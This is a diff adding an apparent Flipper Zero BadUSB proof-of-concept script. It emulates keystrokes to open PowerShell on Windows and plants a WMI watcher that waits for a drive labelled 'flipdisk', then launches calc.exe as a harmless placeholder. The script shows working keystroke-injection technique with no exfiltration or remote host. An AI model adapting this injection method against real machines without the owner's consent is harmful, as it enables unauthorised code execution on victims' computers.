@@ -1,0 +1,26 @@
+REM Author: emptythevoid
+REM Uses Powershell based on GlennChambers https://forum.macrium.com/332/Powershell-script-to-detect-a-certain-drive-that-is-mounted-then-perfrom-backup
+REM Target: Windows 10, 11
+REM Category: PoC
+
+REM example code to demonstrate BadUSB powershell waiting for Flipper disk image to mount after execution
+REM Powershell will wait until a device with the specified drive label is found.
+REM When drive label is mounted, Powershell will launch calc.exe and exit.
+
+
+REM Open Powershell
+DELAY 500
+GUI r
+DELAY 500
+
+REM Run Powershell by full path to avoid Windows Terminal. 
+STRING %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe
+
+DELAY 500
+ENTER
+DELAY 750
+
+ALTSTRING Register-WmiEvent -Class win32_VolumeChangeEvent -SourceIdentifier volumeChange;do{$newEvent = Wait-Event -SourceIdentifier volumeChange;$eventType = $newEvent.SourceEventArgs.NewEvent.EventType;if ($eventType -eq 2){$driveLetter = $newEvent.SourceEventArgs.NewEvent.DriveName;$driveLabel = ([wmi]"Win32_LogicalDisk='$driveLetter'").VolumeName;if ($driveLabel -eq 'flipdisk'){start-sleep -seconds 1;start-process calc.exe;exit;}};Remove-Event -SourceIdentifier volumeChange;} while (1-eq1);Unregister-Event -SourceIdentifier volumeChange
+
+ENTER
+
